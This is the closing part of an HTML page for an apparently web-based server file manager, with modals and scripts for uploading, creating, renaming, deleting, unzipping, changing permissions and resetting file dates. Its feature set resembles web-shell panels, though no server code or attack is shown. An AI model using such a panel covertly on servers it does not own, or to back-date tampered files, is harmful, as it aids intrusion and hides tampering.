<div id="uploadModal" class="modal-overlay" onclick="if(event.target===this)this.style.display='none'">
    <div class="modal">
        <h3>Upload Files</h3>
        <form method="post" enctype="multipart/form-data">
            <input type="file" name="uploads[]" multiple style="margin-bottom: 15px;">
            <div style="text-align: right;">
                <button type="button" class="btn btn-secondary" onclick="document.getElementById('uploadModal').style.display='none'">Cancel</button>
                <button type="submit" name="upload" class="btn btn-primary">Upload</button>
            </div>
        </form>
    </div>
</div>

<!-- Create Modal -->
<div id="createModal" class="modal-overlay" onclick="if(event.target===this)this.style.display='none'">
    <div class="modal">
        <h3 id="createTitle">Create New</h3>
        <form method="post">
            <input type="text" name="name" placeholder="Name" style="margin-bottom: 15px;" required>
            <input type="hidden" name="create" id="createType">
            <div style="text-align: right;">
                <button type="button" class="btn btn-secondary" onclick="document.getElementById('createModal').style.display='none'">Cancel</button>
                <button type="submit" class="btn btn-primary">Create</button>
            </div>
        </form>
    </div>
</div>

<!-- Chmod Modal -->
<div id="chmodModal" class="modal-overlay" onclick="if(event.target===this)this.style.display='none'">
    <div class="modal">
        <h3>Change Permissions</h3>
        <form method="post">
            <input type="hidden" name="action" value="chmod">
            <input type="hidden" name="file" id="chmodFile">
            <input type="text" name="perms" id="chmodPerms" placeholder="0755" style="margin-bottom: 15px;" required pattern="[0-7]{3,4}">
            <div style="text-align: right;">
                <button type="button" class="btn btn-secondary" onclick="document.getElementById('chmodModal').style.display='none'">Cancel</button>
                <button type="submit" class="btn btn-primary">Save</button>
            </div>
        </form>
    </div>
</div>

<!-- Touch Modal -->
<div id="touchModal" class="modal-overlay" onclick="if(event.target===this)this.style.display='none'">
    <div class="modal">
        <h3>Change Date</h3>
        <form method="post">
            <input type="hidden" name="action" value="touch">
            <input type="hidden" name="file" id="touchFile">
            <input type="datetime-local" name="datetime" id="touchDate" style="margin-bottom: 15px;" required step="1">
            <div style="text-align: right;">
                <button type="button" class="btn btn-secondary" onclick="document.getElementById('touchModal').style.display='none'">Cancel</button>
                <button type="submit" class="btn btn-primary">Save</button>
            </div>
        </form>
    </div>
</div>

    </div>
</div>

<!-- Rename Modal -->
<div id="renameModal" class="modal-overlay" onclick="if(event.target===this)this.style.display='none'">
    <div class="modal">
        <h3>Rename Item</h3>
        <form method="post">
            <input type="hidden" name="action" value="rename">
            <input type="hidden" name="oldname" id="renameOldName">
            <input type="text" name="newname" id="renameNewName" placeholder="New Name" style="margin-bottom: 15px;" required>
            <div style="text-align: right;">
                <button type="button" class="btn btn-secondary" onclick="document.getElementById('renameModal').style.display='none'">Cancel</button>
                <button type="submit" class="btn btn-primary">Save</button>
            </div>
        </form>
    </div>
</div>

<!-- Delete Confirmation Modal -->
<div id="deleteModal" class="modal-overlay" onclick="if(event.target===this)this.style.display='none'">
    <div class="modal">
        <h3>Confirm Delete</h3>
        <p>Are you sure you want to delete the selected items?</p>
        <div style="text-align: right; margin-top: 20px;">
            <button type="button" class="btn btn-secondary" onclick="document.getElementById('deleteModal').style.display='none'">Cancel</button>
            <button type="button" class="btn btn-danger" onclick="document.getElementById('deleteForm').submit()">Delete</button>
        </div>
    </div>
</div>



<!-- Unzip Hidden Form -->
<form method="post" id="unzipForm" style="display:none;">
    <input type="hidden" name="action" value="unzip">
    <input type="hidden" name="file" id="unzipFile">
</form>

<script>
function toggleSelectAll(source) {
    document.getElementsByName("selected_files[]").forEach(cb => cb.checked = source.checked);
}

function openCreateModal(type) {
    document.getElementById('createTitle').innerText = 'Create New ' + (type === 'file' ? 'File' : 'Folder');
    document.getElementById('createType').value = type;
    document.getElementById('createModal').style.display = 'flex';
    document.querySelector('#createModal input[type="text"]').focus();
}

function renameItem(oldName) {
    document.getElementById('renameOldName').value = oldName;
    document.getElementById('renameNewName').value = oldName;
    document.getElementById('renameModal').style.display = 'flex';
    document.getElementById('renameNewName').focus();
}

function unzipItem(fileName) {
    if (confirm("Are you sure you want to unzip " + fileName + " here?")) {
        document.getElementById('unzipFile').value = fileName;
        document.getElementById('unzipForm').submit();
    }
}

function touchItem(fileName, currentData) {
    document.getElementById('touchFile').value = fileName;
    document.getElementById('touchDate').value = currentData;
    document.getElementById('touchModal').style.display = 'flex';
}

function confirmDelete() {
    const checked = document.querySelectorAll('input[name="selected_files[]"]:checked');
    if (checked.length === 0) {
        alert("Please select files to delete.");
        return;
    }
    document.getElementById('deleteModal').style.display = 'flex';
}

function chmodItem(fileName, currentPerms) {
    document.getElementById('chmodFile').value = fileName;
    document.getElementById('chmodPerms').value = currentPerms;
    document.getElementById('chmodModal').style.display = 'flex';
    document.getElementById('chmodPerms').focus();
}

// Success Popup Check
window.onload = function() {
    const urlParams = new URLSearchParams(window.location.search);
    const msg = urlParams.get('msg');
    
    const messages = {
        'created': 'Success: Item Created',
        'saved': 'Success: File Saved',
        'uploaded': 'Success: File(s) Uploaded',
        'deleted': 'Success: Item(s) Deleted',
        'unzipped': 'Success: Archive Extracted',
        'date_changed': 'Success: Date Updated',
        'perms_changed': 'Success: Permissions Updated'
    };

    if (messages[msg]) {
        const div = document.createElement('div');
        div.style.position = 'fixed';
        div.style.bottom = '20px';
        div.style.right = '20px';
        div.style.background = 'var(--accent)';
        div.style.color = '#fff';
        div.style.padding = '12px 24px';
        div.style.borderRadius = '6px';
        div.style.boxShadow = '0 4px 6px rgba(0,0,0,0.3)';
        div.style.zIndex = '1000';
        div.textContent = messages[msg];
        document.body.appendChild(div);
        setTimeout(() => div.remove(), 3000);
    }
};

function toggleSidebar() {
    document.querySelector('.sidebar').classList.toggle('open');
    document.querySelector('.mobile-overlay').classList.toggle('open');
}
</script>

</body>
</html>

